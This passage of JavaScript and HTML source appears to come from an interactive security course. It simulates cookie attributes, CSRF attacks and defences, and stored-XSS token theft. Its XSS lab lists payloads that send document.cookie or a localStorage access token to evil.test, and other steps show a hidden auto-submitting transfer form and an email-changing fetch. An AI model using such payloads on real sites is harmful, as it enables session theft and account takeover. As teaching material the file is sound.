      { t: 'Same-origin fetch() from a shop.test page', url: 'https://shop.test/account/orders', p: '/account/orders', cross: false, kind: 'sub', m: 'GET' },
      { t: 'Cross-site link: on evil.test click a link to shop.test', url: 'https://shop.test/', p: '/', cross: true, kind: 'nav', m: 'GET' },
      { t: 'Cross-site form POST auto-submitted by evil.test', url: 'https://shop.test/transfer', p: '/transfer', cross: true, kind: 'nav', m: 'POST' },
      { t: 'Cross-site &lt;img src&gt; on evil.test', url: 'https://shop.test/avatar.png', p: '/avatar.png', cross: true, kind: 'sub', m: 'GET' },
      { t: 'Cross-site fetch(…, {credentials:\'include\'}) from evil.test', url: 'https://shop.test/api/me', p: '/api/me', cross: true, kind: 'sub', m: 'GET' },
      { t: 'Subdomain page https://blog.shop.test (same-site)', url: 'https://blog.shop.test/', p: '/', cross: false, kind: 'nav', m: 'GET', host: 'blog.shop.test' },
      { t: 'User types http://shop.test (plain HTTP)', url: 'http://shop.test/', p: '/', cross: false, kind: 'nav', m: 'GET', http: true },
      { t: 'JavaScript on https://shop.test/ reads <code>document.cookie</code>', js: true, p: '/' },
    ];
    function cfg() {
      return { name: $('#name').value, ho: $('#ho').checked, sec: $('#sec').checked, ss: $('#ss').value, dom: $('#dom').value, path: $('#path').value, age: $('#age').value };
    }
    function header(c) {
      return 'Set-Cookie: ' + c.name + '=Q7mZ2xV9' + (c.dom ? '; Domain=' + c.dom : '') + '; Path=' + c.path + (c.age ? '; Max-Age=' + c.age : '') +
        (c.sec ? '; Secure' : '') + (c.ho ? '; HttpOnly' : '') + (c.ss ? '; SameSite=' + c.ss : '');
    }
    function rejected(c) {
      if (c.ss === 'None' && !c.sec) return 'SameSite=None requires Secure. The browser rejects the cookie.';
      if (c.name.indexOf('__Secure-') === 0 && !c.sec) return 'The __Secure- prefix requires the Secure attribute.';
      if (c.name.indexOf('__Host-') === 0 && (!c.sec || c.dom || c.path !== '/')) return 'The __Host- prefix requires Secure, Path=/ and no Domain (so it is locked to exactly this host).';
      return null;
    }
    function judge(c, x) {
      if (x.js) {
        if (c.ho) return [false, '<code>HttpOnly</code> hides it from JavaScript (and from XSS).'];
        if (c.path !== '/' && x.p.indexOf(c.path) !== 0) return [false, 'Page path / is outside Path=' + c.path + ', so <code>document.cookie</code> doesn’t list it.'];
        return [true, 'Readable: <code>document.cookie</code> → <code>"' + c.name + '=Q7mZ2xV9"</code>. Any XSS can steal it.'];
      }
      if (x.host && !c.dom) return [false, 'Host-only cookie (no Domain): only sent to shop.test exactly, not subdomains.'];
      if (x.http && c.sec) return [false, '<code>Secure</code>: never sent over plain http://.'];
      if (!(c.path === '/' || x.p === c.path || x.p.indexOf(c.path + '/') === 0)) return [false, 'Request path ' + x.p + ' is outside <code>Path=' + c.path + '</code>.'];
      const host = x.host ? ' (Domain=shop.test covers subdomains)' : '';
      if (!x.cross) return [true, 'Same-site request: SameSite doesn’t restrict it' + host + '.'];
      const ss = c.ss || 'Lax';
      const dflt = c.ss ? '' : ' (no SameSite → Chromium treats it as <b>Lax</b>)';
      if (ss === 'Strict') return [false, '<code>Strict</code>: never on cross-site requests, not even link clicks. (User lands logged out.)'];
      if (ss === 'Lax') {
        if (x.kind === 'nav' && x.m === 'GET') return [true, '<code>Lax</code> allows <b>top-level GET navigations</b>' + dflt + '.'];
        if (x.kind === 'nav' && !c.ss) return [false, 'Cross-site POST blocked' + dflt + '. Chrome quirk “Lax+POST”: a cookie without SameSite is still sent here during its first 2 minutes. Firefox & Safari don’t apply Lax-by-default at all.'];
        return [false, '<code>Lax</code> blocks cross-site ' + (x.kind === 'nav' ? 'POST navigations' : 'subresources (img, fetch, iframe)') + dflt + '.'];
      }
      return [true, '<code>SameSite=None</code>: sent on all cross-site requests. ' + (x.kind === 'sub' ? '⚠️ Safari & Firefox block such third-party cookies by default; Chrome still allows them unless the user blocks them.' : 'This is what makes CSRF possible.')];
    }
    function run() {
      const c = cfg();
      paint($('#hdr'), 'HTTP/1.1 200 OK\n' + header(c), ['HttpOnly', 'Secure', 'SameSite', 'Domain', 'Max-Age', '__Host-', '__Secure-']);
      const rej = rejected(c);
      const del = !rej && c.age === '0';
      $('#accept').innerHTML = rej ? '<span class="pill bad">❌ cookie rejected</span> ' + rej :
        del ? '<span class="pill warnp">🗑 stored then deleted immediately</span> <code>Max-Age=0</code> is how a server deletes a cookie (e.g. logout).' :
          '<span class="pill ok">✅ stored</span> ' + (c.age ? 'persists for ' + c.age + ' s (survives a browser restart)' : 'session cookie: gone when the browser session ends');
      $('#ctx').innerHTML = '<tr><th>Context</th><th style="width:70px">Result</th><th>Why</th></tr>' + CTX.map((x) => {
        let r;
        if (rej) r = [false, 'Cookie was never stored.'];
        else if (del) r = [false, 'Cookie deleted.'];
        else r = judge(c, x);
        const lbl = x.js ? (r[0] ? 'readable' : 'hidden') : (r[0] ? 'sent' : 'not sent');
        return '<tr><td>' + x.t + (x.url ? '<div class="muted" style="font-size:11px">' + (x.m || '') + ' ' + x.url + '</div>' : '') + '</td><td><span class="pill ' +
          (r[0] ? (x.js ? 'warnp' : 'ok') : (x.js ? 'ok' : 'bad')) + '">' + lbl + '</span></td><td style="font-size:12px">' + r[1] + '</td></tr>';
      }).join('');
    }
    $$('select, input').forEach((e) => e.addEventListener('change', run));
    run();
  });

  const cookieSeq = W(`<div id="flow"></div>`, function () {
    const C = 'sid=Q7mZ2xV9';
    Seq.mount('#flow', {
      title: 'One cookie (Secure; HttpOnly; SameSite=Lax), five requests',
      actors: [
        { id: 'e', label: 'evil.test page', icon: '😈' },
        { id: 'b', label: 'Browser', icon: '🌐', store: {}, storeLabel: 'Cookie jar' },
        { id: 's', label: 'shop.test', icon: '🖥' },
      ],
      steps: [
        { from: 's', to: 'b', kind: 'res', label: 'Set-Cookie (after login)', msg: 'HTTP/1.1 303 See Other\nLocation: /\nSet-Cookie: ' + C + '; Path=/; Secure; HttpOnly; SameSite=Lax',
          hl: ['SameSite=Lax'], set: { b: { 'shop.test sid': 'Q7mZ2xV9 (Lax, Secure, HttpOnly)' } }, note: 'The browser stores the cookie together with its attributes. Attributes are rules for the browser; they are never sent back.' },
        { from: 'b', to: 's', label: 'same-site GET /orders', msg: 'GET /orders HTTP/1.1\nHost: shop.test\nCookie: ' + C + '\nSec-Fetch-Site: same-origin', hl: ['Cookie'], note: 'Same-site: always sent.' },
        { from: 'e', to: 'b', kind: 'info', label: 'user clicks link to shop.test', msg: '<a href="https://shop.test/">Visit shop</a>' },
        { from: 'b', to: 's', label: 'cross-site top-level GET ✓ cookie', msg: 'GET / HTTP/1.1\nHost: shop.test\nCookie: ' + C + '\nSec-Fetch-Site: cross-site\nSec-Fetch-Mode: navigate', hl: ['Cookie', 'cross-site'],
          note: 'Lax allows <b>top-level navigations with a safe method (GET)</b>, so users arriving from email or search are still logged in.' },
        { from: 'e', to: 'b', kind: 'info', label: 'page auto-submits a POST form', msg: '<form action="https://shop.test/transfer" method="post">…</form>\n<script>document.forms[0].submit()<\/script>' },
        { from: 'b', to: 's', label: 'cross-site POST ✗ no cookie', msg: 'POST /transfer HTTP/1.1\nHost: shop.test\nOrigin: https://evil.test\nSec-Fetch-Site: cross-site\nContent-Type: application/x-www-form-urlencoded\n\nto=mallory&amount=500',
          note: 'No <code>Cookie</code> header! Lax withholds cookies on cross-site POSTs. The server sees an anonymous request.' },
        { from: 'e', to: 'b', kind: 'info', label: '<img src=https://shop.test/avatar>', msg: '<img src="https://shop.test/avatar.png">' },
        { from: 'b', to: 's', label: 'cross-site subresource ✗ no cookie', msg: 'GET /avatar.png HTTP/1.1\nHost: shop.test\nSec-Fetch-Site: cross-site\nSec-Fetch-Dest: image', note: 'Images, iframes and fetch() from other sites: no Lax cookies.' },
        { from: 'b', to: 's', kind: 'info', label: 'http://shop.test ✗ no cookie', msg: 'GET / HTTP/1.1\nHost: shop.test\n# over plain HTTP: Secure cookies are never attached', note: '<code>Secure</code> keeps it off unencrypted connections.' },
      ],
    });
  });

  function attrExercise() {
    $('#name').value = CFG.name; $('#ho').checked = CFG.ho; $('#sec').checked = CFG.sec; $('#ss').value = CFG.ss; $('#dom').value = CFG.dom; $('#path').value = CFG.path;
    function hdr() {
      const c = { name: $('#name').value, ho: $('#ho').checked, sec: $('#sec').checked, ss: $('#ss').value, dom: $('#dom').value, path: $('#path').value };
      $('#out').textContent = 'Set-Cookie: ' + c.name + '=9fK2' + (c.dom ? '; Domain=' + c.dom : '') + '; Path=' + c.path + (c.sec ? '; Secure' : '') + (c.ho ? '; HttpOnly' : '') + (c.ss ? '; SameSite=' + c.ss : '');
      return c;
    }
    $$('select, input').forEach((e) => e.addEventListener('change', hdr));
    hdr();
    $('#check').onclick = () => {
      const c = hdr(), m = [];
      if (!c.ho) m.push('① JS must not read it → HttpOnly.');
      if (!c.sec) m.push('② HTTPS only → Secure.');
      if (c.ss !== 'Lax') m.push('③ + ④: blocked on cross-site POST but sent on link clicks from email → SameSite=Lax (Strict would log email visitors out; None sends it everywhere).');
      if (c.name !== '__Host-sid') m.push('⑤ Locked to this exact host, even against cookies planted by subdomains → the <code>__Host-</code> prefix.');
      if (c.dom) m.push('⑤ Domain must be absent (Domain=shop.test would share it with every subdomain).');
      if (c.path !== '/') m.push('⑥ __Host- requires Path=/, and the whole site needs it.');
      const r = $('#result');
      r.className = 'result ' + (m.length ? 'bad' : 'ok');
      r.innerHTML = m.length ? '❌ ' + m.join('<br>') : '✅ <code>__Host-sid=…; Path=/; Secure; HttpOnly; SameSite=Lax</code> is today’s gold-standard session cookie.';
    };
  }
  const attrExHtml = `
<div class="card">
  <h4>Requirements for the bank’s session cookie</h4>
  <ol style="margin:0;font-size:14px">
    <li>JavaScript can’t read it.</li><li>Never sent over plain HTTP.</li><li>Not sent on a cross-site form POST.</li>
    <li>Still sent when the user clicks a link to the bank in an email.</li>
    <li>Locked to exactly <code>bank.test</code>: subdomains can’t receive or overwrite it.</li><li>Valid on every path.</li>
  </ol>
</div>
<div class="card">
  <div class="row">
    <label>name <select id="name"><option>sid</option><option>__Secure-sid</option><option>__Host-sid</option></select></label>
    <label><input type="checkbox" id="ho"> HttpOnly</label>
    <label><input type="checkbox" id="sec"> Secure</label>
    <label>SameSite <select id="ss"><option value="">(not set)</option><option>Strict</option><option>Lax</option><option>None</option></select></label>
    <label>Domain <select id="dom"><option value="">(none)</option><option>bank.test</option></select></label>
    <label>Path <select id="path"><option>/</option><option>/account</option></select></label>
  </div>
  <pre id="out" class="seq-msg"></pre>
  <div class="row"><button id="check" class="primary">Check</button></div>
  <div id="result" class="result"></div>
</div>`;

  // ======================= csrf =======================
  const csrfSeq = W(`<div id="flow"></div>`, function () {
    const sid = 'sid=Hn4tY8wQ', tok = Auth.randB64url(18);
    const evilPage = 'HTTP/1.1 200 OK\nContent-Type: text/html\n\n<h1>Cute cats 🐱</h1>\n<form action="https://bank.test/transfer" method="POST" hidden>\n  <input name="to" value="mallory">\n  <input name="amount" value="5000">\n</form>\n<script>document.forms[0].submit()<\/script>';
    const attack = (cookie, extra) => 'POST /transfer HTTP/1.1\nHost: bank.test\nOrigin: https://evil.test\nSec-Fetch-Site: cross-site\nSec-Fetch-Mode: navigate\n' +
      (cookie ? 'Cookie: ' + sid + '\n' : '') + 'Content-Type: application/x-www-form-urlencoded\n\nto=mallory&amount=5000' + (extra || '');
    const actors = (ss) => [
      { id: 'b', label: 'Alice’s browser', icon: '🌐', store: { 'bank.test cookie': sid + ' (SameSite=' + ss + ')' }, storeLabel: 'Cookie jar' },
      { id: 'e', label: 'evil.test', icon: '😈' },
      { id: 's', label: 'bank.test', icon: '🏦', store: { 'alice balance': '$7,000', 'mallory balance': '$0' }, storeLabel: 'Bank' },
    ];
    const start = [
      { from: 'b', to: 'e', label: 'GET https://evil.test/cats', msg: 'GET /cats HTTP/1.1\nHost: evil.test', note: 'Alice is logged in to bank.test in one tab and clicks a link to “cute cats” in another.' },
      { from: 'e', to: 'b', kind: 'res', label: '200 page with hidden auto-form', msg: evilPage, hl: ['https://bank.test/transfer', 'submit()'],
        note: 'evil.test can’t read bank.test (Same-Origin Policy) but it can make the browser <b>send</b> a request there.' },
    ];
    Seq.mount('#flow', {
      title: 'Cross-Site Request Forgery',
      scenarios: [
        { name: '💥 Attack (SameSite=None, no token)', actors: actors('None'), steps: start.concat([
          { from: 'b', to: 'b', label: 'auto-submit: attach cookies?', note: 'The form targets bank.test → the browser checks its jar. The cookie is <code>SameSite=None</code> → attach it.' },
          { from: 'b', to: 's', label: 'POST /transfer + Cookie', msg: attack(true), hl: ['Cookie', 'evil.test'], note: 'From the bank’s point of view this looks like Alice clicking “Transfer”: her valid session cookie is right there.' },
          { from: 's', to: 's', label: 'session ✓ → transfer!', note: 'Valid session = alice. The bank has no other check.', set: { s: { 'alice balance': '$2,000', 'mallory balance': '$5,000' } } },
          { from: 's', to: 'b', kind: 'err', label: '303 → /done 💸', msg: 'HTTP/1.1 303 See Other\nLocation: /done', note: 'The response goes to Alice’s browser (evil.test can’t read it) but the damage is done.' },
        ]) },
        { name: '🛡 SameSite=Lax', actors: actors('Lax'), steps: start.concat([
          { from: 'b', to: 'b', label: 'cross-site POST: withhold Lax cookie', note: 'Top-level navigation, but the method is POST, and the request comes from another site → Lax cookies stay home.' },
          { from: 'b', to: 's', label: 'POST /transfer (no Cookie)', msg: attack(false), hl: ['evil.test'] },
          { from: 's', to: 's', label: 'no session → anonymous', note: 'Nothing to authorize.' },
          { from: 's', to: 'b', kind: 'redirect', label: '303 → /login', msg: 'HTTP/1.1 303 See Other\nLocation: /login', note: 'Blocked. Chromium applies Lax by default to cookies without SameSite; Firefox and Safari don’t, so <b>always set it explicitly</b>, and keep a second defense.' },
        ]) },
        { name: '🛡 CSRF token', actors: actors('None'), steps: [
          { from: 'b', to: 's', label: 'GET /transfer (real form)', msg: 'GET /transfer HTTP/1.1\nHost: bank.test\nCookie: ' + sid, note: 'Legit flow first: Alice opens the bank’s own transfer page.' },
          { from: 's', to: 'b', kind: 'res', label: '200 form + hidden csrf_token', msg: 'HTTP/1.1 200 OK\nContent-Type: text/html\n\n<form method="POST" action="/transfer">\n  <input type="hidden" name="csrf_token" value="' + tok + '">\n  …\n</form>',
            hl: [tok], note: '<b>Synchronizer token</b>: a random value stored in Alice’s session and embedded in the bank’s own page.', set: { s: { 'session.csrf': tok.slice(0, 10) + '…' } } },
        ].concat(start, [
          { from: 'b', to: 's', label: 'POST /transfer + Cookie, no token', msg: attack(true), hl: ['Cookie'], note: 'The cookie is attached (SameSite=None)… but evil.test had no way to read the token from the bank’s page.' },
          { from: 's', to: 's', label: 'csrf_token missing ✗', note: '<code>body.csrf_token</code> must equal <code>session.csrf</code> (compared in constant time).' },
          { from: 's', to: 'b', kind: 'err', label: '403 Forbidden', msg: 'HTTP/1.1 403 Forbidden\nContent-Type: text/plain\n\nInvalid CSRF token', hl: ['403'], note: 'Blocked even though the cookie was sent.' },
        ]) },
        { name: '🛡 Origin / Sec-Fetch-Site check', actors: actors('None'), steps: start.concat([
          { from: 'b', to: 's', label: 'POST /transfer + Cookie', msg: attack(true), hl: ['Origin: https://evil.test', 'Sec-Fetch-Site: cross-site'],
            note: 'Browsers add <code>Origin</code> to POSTs and <code>Sec-Fetch-Site</code> to every request. Page JavaScript can’t forge them.' },
          { from: 's', to: 's', label: 'cross-site → reject', note: 'Rule: for state-changing requests, allow only <code>Sec-Fetch-Site: same-origin</code> (or <code>none</code> = user typed it), or an <code>Origin</code> on the allowlist.' },
          { from: 's', to: 'b', kind: 'err', label: '403 Forbidden', msg: 'HTTP/1.1 403 Forbidden\n\ncross-site request rejected', note: 'Cheap and effective; frameworks increasingly do this by default. Combine with SameSite cookies and tokens for defense in depth.' },
        ]) },
      ],
    });
  });

  const csrfLab = W(`
<div class="grid2">
  <div class="card">
    <h4>🏦 bank.test settings</h4>
    <div class="row"><label>Session cookie SameSite <select id="ss"><option>None</option><option>Lax</option><option>Strict</option></select></label></div>
    <div class="row"><label><input type="checkbox" id="tok"> require CSRF token</label></div>
    <div class="row"><label><input type="checkbox" id="org"> reject cross-site <code>Sec-Fetch-Site</code> / foreign <code>Origin</code></label></div>
    <div class="row"><label><input type="checkbox" id="get"> (bad idea) also accept <code>GET /transfer?to=…</code></label></div>
    <div style="margin-top:6px">Alice: <b id="ba"></b> · Mallory: <b id="bm"></b> <button id="reset" class="chip">reset</button></div>
  </div>
  <div class="card">
    <h4>😈 evil.test attack</h4>
    <div class="row"><select id="atk" style="width:100%">
      <option value="form">Auto-submitted hidden &lt;form method=POST&gt;</option>
      <option value="nav">Top-level redirect: location = "https://bank.test/transfer?to=mallory&amp;amount=500"</option>
      <option value="img">&lt;img src="https://bank.test/transfer?to=mallory&amp;amount=500"&gt;</option>
    </select></div>
    <button id="go" class="primary" style="margin-top:6px">🐱 Alice visits evil.test</button>
  </div>
</div>
<div class="card"><h4>Request the browser sends</h4><pre id="req" class="seq-msg" style="max-height:200px"></pre></div>
<div class="card"><h4>Bank’s decision</h4><div id="dec"></div></div>
`, function () {
    let alice = 7000, mal = 0;
    function bal() { $('#ba').textContent = '$' + alice.toLocaleString(); $('#bm').textContent = '$' + mal.toLocaleString(); }
    $('#go').onclick = () => {
      const ss = $('#ss').value, atk = $('#atk').value, needTok = $('#tok').checked, chkOrg = $('#org').checked, acceptGet = $('#get').checked;
      const method = atk === 'form' ? 'POST' : 'GET';
      const nav = atk !== 'img';
      const send = ss === 'None' || (ss === 'Lax' && nav && method === 'GET');
      const amount = atk === 'form' ? 5000 : 500;
      const lines = [method + (method === 'GET' ? ' /transfer?to=mallory&amount=500' : ' /transfer') + ' HTTP/1.1', 'Host: bank.test'];
      if (method === 'POST') lines.push('Origin: https://evil.test');
      lines.push('Sec-Fetch-Site: cross-site', 'Sec-Fetch-Mode: ' + (nav ? 'navigate' : 'no-cors'), 'Sec-Fetch-Dest: ' + (nav ? 'document' : 'image'));
      if (send) lines.push('Cookie: sid=Hn4tY8wQ');
      if (method === 'POST') lines.push('Content-Type: application/x-www-form-urlencoded', '', 'to=mallory&amount=5000');
      paint($('#req'), lines.join('\n'), ['Cookie', 'cross-site']);
      const trace = [];
      const step = (ok, t) => trace.push((ok ? '✅ ' : '❌ ') + t);
      let done = true;
      step(send, send ? 'Cookie attached (SameSite=' + ss + ' allows ' + (nav ? 'this ' + method + ' navigation' : 'this subresource') + ')' :
        'Browser withheld the cookie: SameSite=' + ss + ' blocks ' + (ss === 'Strict' ? 'every cross-site request' : nav ? 'cross-site POST' : 'cross-site subresources'));
      if (!send) done = false;
      if (done && method === 'GET' && !acceptGet) { step(false, 'Route only accepts POST → 405 Method Not Allowed. (GET must never change state.)'); done = false; }
      if (done && chkOrg) { step(false, 'Sec-Fetch-Site: cross-site → 403 Forbidden'); done = false; }
      if (done && needTok) { step(false, 'No csrf_token (evil.test can’t read it) → 403 Forbidden'); done = false; }
      if (done) { alice -= amount; mal += amount; step(true, 'Session valid → <b>$' + amount + ' transferred to mallory</b> 💸'); }
      $('#dec').innerHTML = trace.map((t) => '<div>' + t + '</div>').join('') + (done ? '<div class="pill bad" style="margin-top:4px">ATTACK SUCCEEDED</div>' : '<div class="pill ok" style="margin-top:4px">ATTACK BLOCKED</div>');
      bal();
    };
    $('#reset').onclick = () => { alice = 7000; mal = 0; bal(); };
    bal();
    paint($('#req'), '# click "Alice visits evil.test"');
  });

  function csrfExercise() {
    const ANS = ['allow', 'block', 'block', 'block', 'block'];
    $$('select.q').forEach((s, i) => { s.value = CFG.fill ? ANS[i] : ''; });
    $('#check').onclick = () => {
      const why = ['Valid session, matching token, own origin.', 'Token missing.', 'Token doesn’t match the session’s token.', 'No session cookie: not logged in (redirect to login).', 'Origin is evil.test: rejected even though the token matches (maybe it leaked).'];
      let good = 0;
      $$('select.q').forEach((s, i) => {
        const ok = s.value === ANS[i];
        if (ok) good++;
        s.style.background = s.value ? (ok ? '#dcfce7' : '#fee2e2') : '';
        $$('.fb')[i].textContent = s.value ? (ok ? '✅ ' : '❌ ') + why[i] : '';
      });
      const r = $('#result');
      r.className = 'result ' + (good === 5 ? 'ok' : 'bad');
      r.innerHTML = good === 5 ? '✅ 5 / 5. You are a working CSRF filter.' : '❌ ' + good + ' / 5 correct.';
    };
  }
  const sel = '<select class="q"><option></option><option value="allow">✅ allow</option><option value="block">⛔ block</option></select>';
  const csrfExHtml = `
<div class="card">
  <h4>Server policy for <code>POST /transfer</code></h4>
  <div class="muted">Allow only if: ① cookie <code>sid=Hn4t</code> maps to a session (alice, whose <code>session.csrf = "t0k3n"</code>),
    ② body <code>csrf_token</code> equals <code>t0k3n</code>, ③ <code>Origin</code> is <code>https://bank.test</code>.</div>
  <table class="t" style="margin-top:6px">
    <tr><th>#</th><th>Cookie</th><th>Origin</th><th>body csrf_token</th><th>Decision</th><th></th></tr>
    <tr><td>1</td><td>sid=Hn4t</td><td>https://bank.test</td><td>t0k3n</td><td>${sel}</td><td class="fb"></td></tr>
    <tr><td>2</td><td>sid=Hn4t</td><td>https://bank.test</td><td><i>(missing)</i></td><td>${sel}</td><td class="fb"></td></tr>
    <tr><td>3</td><td>sid=Hn4t</td><td>https://bank.test</td><td>guess123</td><td>${sel}</td><td class="fb"></td></tr>
    <tr><td>4</td><td><i>(none)</i></td><td>https://bank.test</td><td>t0k3n</td><td>${sel}</td><td class="fb"></td></tr>
    <tr><td>5</td><td>sid=Hn4t</td><td>https://evil.test</td><td>t0k3n</td><td>${sel}</td><td class="fb"></td></tr>
  </table>
  <div class="row"><button id="check" class="primary">Check</button></div>
  <div id="result" class="result"></div>
</div>`;

  // ======================= xss-token-theft =======================
  const xssLab = W(`
<div class="grid2">
  <div class="card">
    <h4>⚙️ shop.test configuration</h4>
    <div class="row"><label>Render reviews with
      <select id="render"><option value="html">innerHTML (unsafe)</option><option value="text">textContent / escaped (safe)</option></select></label></div>
    <div class="row"><label><input type="checkbox" id="csp"> send <code>Content-Security-Policy: script-src 'self'</code></label></div>
    <div class="row"><label><input type="checkbox" id="ho" checked> session cookie is <code>HttpOnly</code></label></div>
    <div class="row"><label><input type="checkbox" id="ls" checked> app keeps an <code>access_token</code> in localStorage</label></div>
    <div class="muted" style="font-size:12px">Simulated (nothing really runs): the widget interprets your payload the way a browser would.</div>
  </div>
  <div class="card">
    <h4>✍️ Attacker posts a review</h4>
    <textarea id="pl" class="code" rows="3"></textarea>
    <div class="row">
      <button class="chip" data-i="0">harmless &lt;b&gt;</button><button class="chip" data-i="1">steal cookie</button>
      <button class="chip" data-i="2">steal localStorage</button><button class="chip" data-i="3">act as user</button>
      <button class="chip" data-i="4">&lt;script&gt; tag</button>
    </div>
    <button id="post" class="primary">Post review → victim opens the page</button>
  </div>
</div>
<div class="grid2">
  <div class="card"><h4>👩 Victim’s view of https://shop.test/product/42</h4><div id="view" style="border:1px dashed #c5c9d6;border-radius:8px;padding:8px;min-height:50px"></div>
    <div id="console" style="font:11.5px/1.5 ui-monospace,Menlo,monospace;margin-top:6px"></div></div>
  <div class="card"><h4>😈 What evil.test receives / achieves</h4><div id="loot" style="font:12px/1.5 ui-monospace,Menlo,monospace"></div></div>
</div>
`, function () {
    const P = [
      'Great product! <b>5 stars</b>',
      '<img src=x onerror="new Image().src=\'https://evil.test/c?d=\'+document.cookie">',
      '<img src=x onerror="new Image().src=\'https://evil.test/c?d=\'+localStorage.getItem(\'access_token\')">',
      '<img src=x onerror="fetch(\'/api/account/email\',{method:\'POST\',body:\'email=mallory@evil.test\'})">',
      '<script>alert(document.cookie)<\/script>',
    ];
    $('#pl').value = P[1];
    $$('[data-i]').forEach((b) => (b.onclick = () => { $('#pl').value = P[+b.dataset.i]; }));
    const TOKEN = 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhbGljZSJ9.4pcPyMD09olPSyXnrXCjTwXyr4BsezdI1AVTmud2fU4';
    function sanitizeForDisplay(html) {
      const d = new DOMParser().parseFromString('<div>' + html + '</div>', 'text/html').body.firstChild;
      const info = { handlers: [], scripts: 0 };
      d.querySelectorAll('*').forEach((el) => {
        if (el.tagName === 'SCRIPT') { info.scripts++; el.replaceWith(Object.assign(document.createElement('code'), { textContent: '<script> element (inert)' })); return; }
        Array.from(el.attributes).forEach((a) => { if (/^on/i.test(a.name)) { info.handlers.push(a.name + '="' + a.value + '"'); el.removeAttribute(a.name); } });
        if (el.tagName === 'IMG') { el.removeAttribute('src'); el.alt = '🖼 broken image'; el.style.cssText = 'border:1px solid #fca5a5;padding:2px 6px;font-size:12px'; }
      });
      return { node: d, info };
    }
    $('#post').onclick = () => {
      const pl = $('#pl').value, mode = $('#render').value, csp = $('#csp').checked, ho = $('#ho').checked, ls = $('#ls').checked;
      const con = [], loot = [];
      const view = $('#view');
      view.innerHTML = '<div class="muted" style="font-size:12px">Review by mallory:</div>';
      if (mode === 'text') {
        const p = document.createElement('div');
        p.textContent = pl;
        view.appendChild(p);
        con.push('<span style="color:#166534">// escaped: &lt; became &amp;lt; → shown as text, no element created, nothing runs</span>');
      } else {
        const s = sanitizeForDisplay(pl);
        view.appendChild(s.node);
        if (s.info.scripts) con.push('<span style="color:#646b80">// &lt;script&gt; inserted via innerHTML is never executed by browsers…</span>', '<span style="color:#646b80">// …but event handlers like onerror ARE. Attackers know this.</span>');
        s.info.handlers.forEach((h) => {
          if (csp) { con.push('<span style="color:#dc2626">Refused to execute inline event handler because it violates the following Content Security Policy directive: "script-src \'self\'".</span>'); return; }
          con.push('<span style="color:#7c3aed">⚡ ' + esc(h.slice(0, 60)) + '… ran in the origin https://shop.test</span>');
          const cookies = ['theme=light'].concat(ho ? [] : ['sid=Hn4tY8wQ']).join('; ');
          if (/document\.cookie/.test(h)) {
            loot.push('GET https://evil.test/c?d=' + encodeURIComponent(cookies));
            loot.push(ho ? '→ only <b>theme=light</b>. The HttpOnly sid is invisible to JS ✅' : '→ <b style="color:#dc2626">sid=Hn4tY8wQ stolen</b>: attacker pastes it into their browser = logged in as alice');
          }
          if (/localStorage/.test(h)) {
            loot.push('GET https://evil.test/c?d=' + (ls ? TOKEN.slice(0, 28) + '…' : 'null'));
            loot.push(ls ? '→ <b style="color:#dc2626">access token stolen</b>: usable from anywhere until it expires (<code>Authorization: Bearer …</code>)' : '→ nothing in localStorage ✅');
          }
          if (/fetch\(/.test(h)) {
            loot.push('POST https://shop.test/api/account/email   (sent by the victim’s browser)');
            loot.push('Cookie: ' + cookies + (ho ? '; sid=Hn4tY8wQ  ← HttpOnly cookies are still attached!' : ''));
            loot.push('→ <b style="color:#dc2626">200 OK: email changed to mallory@evil.test</b>. Next: “forgot password” → account takeover. HttpOnly does <b>not</b> stop this.');
          }
        });
        if (!s.info.handlers.length && !s.info.scripts) con.push('// plain HTML only: rendered, nothing executed');
      }
      $('#console').innerHTML = '<div class="muted">DevTools console:</div>' + con.join('<br>');
      $('#loot').innerHTML = loot.length ? loot.join('<br>') : '<span class="muted">nothing 🎉</span>';
    };
    $('#post').click();
  });

  const xssSeq = W(`<div id="flow"></div>`, function () {
    const tok = 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhbGljZSJ9.4pcP…';
    const stored = '<img src=x onerror="new Image().src=\'https://evil.test/c?d=\'+localStorage.access_token">';
    const A = [
      { id: 'x', label: 'Attacker', icon: '🕵' },
      { id: 'b', label: 'Alice’s browser', icon: '🌐', store: { 'localStorage.access_token': tok, 'cookie sid': 'Hn4t… (HttpOnly)' }, storeLabel: 'shop.test storage' },
      { id: 's', label: 'shop.test', icon: '🖥', store: {}, storeLabel: 'Reviews DB' },
      { id: 'e', label: 'evil.test', icon: '😈', store: {}, storeLabel: 'Attacker’s loot' },
    ];
    const plant = [
      { from: 'x', to: 's', label: 'POST /reviews (payload)', msg: 'POST /reviews HTTP/1.1\nHost: shop.test\nContent-Type: application/x-www-form-urlencoded\n\ntext=' + encodeURIComponent(stored).slice(0, 80) + '…',
        note: '<b>Stored XSS</b>: the attacker saves HTML as a “review”.', set: { s: { 'review #9': '<img onerror=…>' } } },
      { from: 'b', to: 's', label: 'GET /product/42', msg: 'GET /product/42 HTTP/1.1\nHost: shop.test\nCookie: sid=Hn4t…' },
      { from: 's', to: 'b', kind: 'res', label: '200 page incl. raw review', msg: 'HTTP/1.1 200 OK\nContent-Type: text/html\n\n<div class="review">' + stored + '</div>', hl: ['onerror'],
        note: 'The server put the review into the page <b>without escaping</b>. The browser can’t tell it apart from the site’s own code.' },
    ];
    Seq.mount('#flow', {
      title: 'Stored XSS: the attacker’s script runs as shop.test',
      actors: A,
      scenarios: [
        { name: '🔓 Token in localStorage', steps: plant.concat([
          { from: 'b', to: 'b', label: 'onerror runs: read localStorage', note: 'Same origin as the app → full access to <code>localStorage</code>, <code>sessionStorage</code> and non-HttpOnly cookies.' },
          { from: 'b', to: 'e', kind: 'err', label: 'GET evil.test/c?d=<token>', msg: 'GET /c?d=' + tok + ' HTTP/1.1\nHost: evil.test', hl: [tok], set: { e: { stolen: 'access_token' } } },
          { from: 'x', to: 's', kind: 'err', label: 'GET /api/orders + stolen Bearer', msg: 'GET /api/orders HTTP/1.1\nHost: shop.test\nAuthorization: Bearer ' + tok, hl: ['Authorization'],
            note: 'The token works from the attacker’s own machine, for as long as it is valid, even after Alice closes the tab.' },
        ]) },
        { name: '🔒 HttpOnly cookie (still dangerous)', steps: plant.concat([
          { from: 'b', to: 'b', label: 'document.cookie → no sid', msg: '> document.cookie\n"theme=light"', note: '<code>HttpOnly</code> keeps the session id out of JavaScript: nothing to exfiltrate.' },
